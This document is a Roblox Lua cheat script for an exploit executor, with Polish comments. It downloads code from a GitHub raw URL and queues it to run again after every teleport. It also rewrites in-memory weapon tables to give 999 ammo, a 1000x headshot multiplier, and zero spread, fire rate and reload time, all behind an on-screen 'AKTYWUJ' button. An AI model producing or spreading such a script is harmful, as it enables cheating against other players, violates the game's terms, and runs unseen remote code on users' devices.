local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local SCRIPT_URL = "https://raw.githubusercontent.com/cichonowek/HACK/refs/heads/master/log.txt"

local function Queue()
    if queue_on_teleport then
        queue_on_teleport(game:HttpGet(SCRIPT_URL))
    end
end

-- kolejkuj OD RAZU
Queue()

-- kolejkuj PRZY KAŻDYM TELEPORCIE (Delta fix)
TeleportService.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        Queue()
    end
end)

if queue_on_teleport then queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/cichonowek/HACK/refs/heads/master/log.txt")) end


local CoreGui = game:GetService("CoreGui")

if CoreGui:FindFirstChild("MobileActivatorGUI") then
    CoreGui.MobileActivatorGUI:Destroy()
end

local function SetGcValue(str, val)
    for _, Table in next, getgc(true) do
        if type(Table) == "table" then
            if table.isfrozen(Table) then
                make_writeable(Table)
            end
            if rawget(Table, str) ~= nil then
                rawset(Table, str, val)
            end
        end
    end
end

local function ActivateScript()
    SetGcValue("Ammo", 999)
    SetGcValue("HeadshotMultiplier", 1000)
    SetGcValue("MaxSpread", 0)
    SetGcValue("FireRate", 0)
    SetGcValue("AmmoPerMag", 999)
    SetGcValue("ReloadTime", 0)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MobileActivatorGUI"
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(0, 140, 0, 38)
Button.Position = UDim2.new(0.5, -70, 0.05, 0)
Button.Text = "AKTYWUJ"
Button.TextScaled = true
Button.BackgroundColor3 = Color3.fromRGB(0,170,255)
Button.TextColor3 = Color3.new(1,1,1)
Button.Parent = ScreenGui

Instance.new("UICorner", Button).CornerRadius = UDim.new(0,12)

Button.MouseButton1Click:Connect(ActivateScript)
